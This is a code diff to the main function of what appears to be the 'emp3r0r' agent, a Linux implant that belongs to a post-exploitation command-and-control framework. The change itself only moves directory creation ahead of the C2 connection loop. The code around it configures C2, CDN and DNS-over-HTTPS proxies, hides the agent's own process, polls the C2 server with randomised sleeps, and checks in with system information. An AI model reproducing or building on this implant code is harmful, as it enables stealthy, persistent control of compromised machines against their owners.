@@ -18,6 +18,7 @@ import (
 )
 
 func main() {
+	var err error
 	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
 	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
 	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
@@ -30,6 +31,14 @@ func main() {
 	if !*silent {
 		fmt.Println("emp3r0r agent has started")
 		log.SetOutput(os.Stderr)
+	}
+
+	// mkdir -p
+	if !agent.IsFileExist(agent.UtilsPath) {
+		err = os.MkdirAll(agent.UtilsPath, 0700)
+		if err != nil {
+			log.Fatalf("[-] Cannot mkdir %s: %v", agent.AgentRoot, err)
+		}
 	}
 
 	// if the agent's process name is not "emp3r0r"
@@ -137,7 +146,7 @@ func main() {
 	}
 
 	// hide process of itself if possible
-	err := agent.UpdateHIDE_PIDS()
+	err = agent.UpdateHIDE_PIDS()
 	if err != nil {
 		log.Print(err)
 	}
@@ -145,20 +154,11 @@ func main() {
 	// apply whatever proxy setting we have just added
 	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
 connect:
-
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if !agent.IsCCOnline(agent.AgentProxy) {
 		log.Println("CC not online")
 		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
 		goto connect
-	}
-
-	// mkdir -p
-	if !agent.IsFileExist(agent.UtilsPath) {
-		err = os.MkdirAll(agent.UtilsPath, 0700)
-		if err != nil {
-			log.Fatalf("[-] Cannot mkdir %s: %v", agent.AgentRoot, err)
-		}
 	}
 
 	// check in with system info
